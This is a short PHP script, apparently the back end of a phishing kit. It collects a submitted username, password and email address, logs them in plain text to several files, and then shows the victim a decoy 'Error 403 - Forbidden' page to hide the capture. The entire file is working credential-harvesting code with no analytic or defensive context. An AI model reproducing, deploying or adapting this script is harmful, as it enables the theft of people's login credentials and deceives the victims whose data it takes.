<?php

$UserName = $_POST["UN"];
$Password = $_POST["PW"];
$Email = $_POST["EM"];

$File = '../../log/info.txt';
$FP = fopen($File, 'a') or die("Cant Open The File...");
fwrite($FP, "UserName: $UserName\n");
fwrite($FP, "Password: $Password\n");
fwrite($FP, "Email: $Email\n");
fclose($FP);

$UD_File = 'u_data.txt';
$UD_FP = fopen($UD_File, 'w');
fwrite($UD_FP, $UserName);
fclose($UD_FP);

$PD_File = 'p_data.txt';
$PD_FP = fopen($PD_File, 'w');
fwrite($PD_FP, $Password);
fclose($PD_FP);

$ED_File = 'e_data.txt';
$ED_FP = fopen($ED_File, 'w');
fwrite($ED_FP, $Email);
fclose($ED_FP);



?>

<html>
    <head>
        <style>
            body {
                text-align: center;
                font-size: 15px;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <p>
        Error 403 - Forbidden
        </p>
    </body>
</html>